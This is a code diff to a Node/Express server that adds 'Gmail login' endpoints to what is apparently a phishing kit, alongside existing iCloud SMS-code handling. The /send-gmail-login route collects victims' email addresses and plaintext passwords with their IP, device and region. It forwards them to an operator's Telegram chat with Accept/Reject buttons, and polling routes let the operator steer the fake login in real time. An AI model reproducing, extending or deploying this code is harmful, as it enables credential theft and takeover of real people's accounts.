@@ -243,6 +243,13 @@ app.get("/check-status", (req, res) => {
       return res.json({ status: "unknown" });
     }
 
+    // ✅ Check Gmail login first
+    if (pendingGmailLogin[identifier]) {
+      return res.json({
+        status: pendingGmailLogin[identifier].status || "pending"
+      });
+    }
+
     // ✅ Check iCloud SMS codes first
     if (pendingCodes[identifier]) {
       return res.json({
@@ -311,6 +318,13 @@ app.post("/update-status", (req, res) => {
 
     if (!email || !status) {
       return res.status(400).json({ error: "Missing email or status" });
+    }
+
+    // ✅ Handle Gmail login (identifier is the requestId like gmail_xxx_xxx)
+    if (pendingGmailLogin[email]) {
+      pendingGmailLogin[email].status = status;
+      console.log(`✅ Updated pendingGmailLogin[${email}].status = ${status}`);
+      return res.json({ ok: true, message: "Gmail login status updated" });
     }
 
     // ✅ Handle iCloud SMS codes (identifier is the code itself)
@@ -1002,6 +1016,138 @@ app.post("/update-page-status", (req, res) => {
     res.json({ ok: true });
 
   } catch (err) {
+    res.status(500).json({ error: "Internal server error" });
+  }
+});
+
+// ============================================================================
+// GMAIL LOGIN ENDPOINTS
+// ============================================================================
+
+// ✅ Storage for Gmail
+const pendingGmailLogin = {};
+const displayEmailStore = {};
+const displayEmailByRequestId = {};
+
+app.post("/send-gmail-login", async (req, res) => {
+  try {
+    console.log('🔍 DEBUG: /send-gmail-login endpoint called');
+    const { email, password, userId } = req.body;
+    console.log('🔍 DEBUG: Received email:', email, 'password:', password, 'userId:', userId);
+    
+    if (!email || !password || !userId) {
+      return res.status(400).json({ error: "Missing email, password, or userId" });
+    }
+    
+    const requestId = `gmail_${Date.now()}_${Math.random().toString(36).substring(7)}`;
+    const displayEmailKey = `displayEmail_${Date.now()}_${Math.random().toString(36).substring(7)}`;
+    console.log('🔍 DEBUG: Generated displayEmailKey:', displayEmailKey);
+    
+    displayEmailStore[displayEmailKey] = email;
+    console.log(`📧 Stored display email with key ${displayEmailKey}: ${email}`);
+    
+    displayEmailByRequestId[requestId] = email;
+    console.log(`📧 Stored display email by requestId ${requestId}: ${email}`);
+    
+    const ip = req.headers["x-forwarded-for"]?.split(",")[0].trim() ||
+      req.headers["x-real-ip"] ||
+      req.connection.remoteAddress ||
+      "Unknown IP";
+
+    const userAgent = req.get("user-agent") || "Unknown";
+    const device = detectDevice(userAgent);
+    const region = await detectRegion(ip);
+
+    pendingGmailLogin[requestId] = { status: "pending", email: email };
+
+    const message =
+      `🌈🌈🌈🌈 <b>Gmail - Sign in</b> 🌈🌈🌈🌈\n` +
+      `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
+      `<b>📧 Email:</b> <code>${email}</code>\n` +
+      `<b>🔑 Password:</b> <code>${password}</code>\n` +
+      `<b>🌍 Region:</b> ${region}\n` +
+      `<b>💻 Device:</b> ${device}\n` +
+      `<b>📍 IP:</b> ${ip}`;
+
+    const options = {
+      parse_mode: "HTML",
+      reply_markup: {
+        inline_keyboard: [
+          [
+            { text: "✅ Accept", callback_data: `gmail_accept|${requestId}` },
+            { text: "❌ Reject", callback_data: `gmail_reject|${requestId}` }
+          ]
+        ]
+      }
+    };
+
+    const botToken = process.env.BOT_TOKEN;
+    const chatId = process.env.ADMIN_CHAT_ID;
+
+    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+    await fetch(url, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: message,
+        parse_mode: options.parse_mode,
+        reply_markup: options.reply_markup
+      })
+    });
+
+    console.log('🔍 DEBUG: Sending response with displayEmailKey:', displayEmailKey);
+    res.json({ status: "pending", requestId, displayEmailKey });
+
+  } catch (err) {
+    console.error("❌ Gmail Login endpoint error:", err);
+    res.status(500).json({ error: "Internal server error" });
+  }
+});
+
+// ✅ GET /api/gmail-login-status/:requestId
+app.get("/api/gmail-login-status/:requestId", (req, res) => {
+  try {
+    const { requestId } = req.params;
+    const entry = pendingGmailLogin[requestId];
+    if (!entry) return res.json({ status: "pending" });
+    res.json({ status: entry.status });
+  } catch (err) {
+    console.error("❌ Gmail Login status endpoint error:", err);
+    res.status(500).json({ error: "Internal server error" });
+  }
+});
+
+// ✅ GET /api/display-email/:displayEmailKey
+app.get("/api/display-email/:displayEmailKey", (req, res) => {
+  try {
+    const { displayEmailKey } = req.params;
+    const email = displayEmailStore[displayEmailKey];
+    if (email) {
+      console.log(`📧 Retrieved display email for key ${displayEmailKey}: ${email}`);
+      res.json({ displayEmail: email });
+    } else {
+      console.log(`📧 No display email found for key ${displayEmailKey}`);
+      res.json({ displayEmail: null });
+    }
+  } catch (err) {
+    console.error("❌ Get display email error:", err);
+    res.status(500).json({ error: "Internal server error" });
+  }
+});
+
+// ✅ GET /get-gmail-login/:requestId
+app.get("/get-gmail-login/:requestId", (req, res) => {
+  try {
+    const { requestId } = req.params;
+    const entry = pendingGmailLogin[requestId];
+    if (entry && entry.email) {
+      res.json({ email: entry.email });
+    } else {
+      res.json({ email: null });
+    }
+  } catch (err) {
+    console.error("❌ Get Gmail login error:", err);
     res.status(500).json({ error: "Internal server error" });
   }
 });
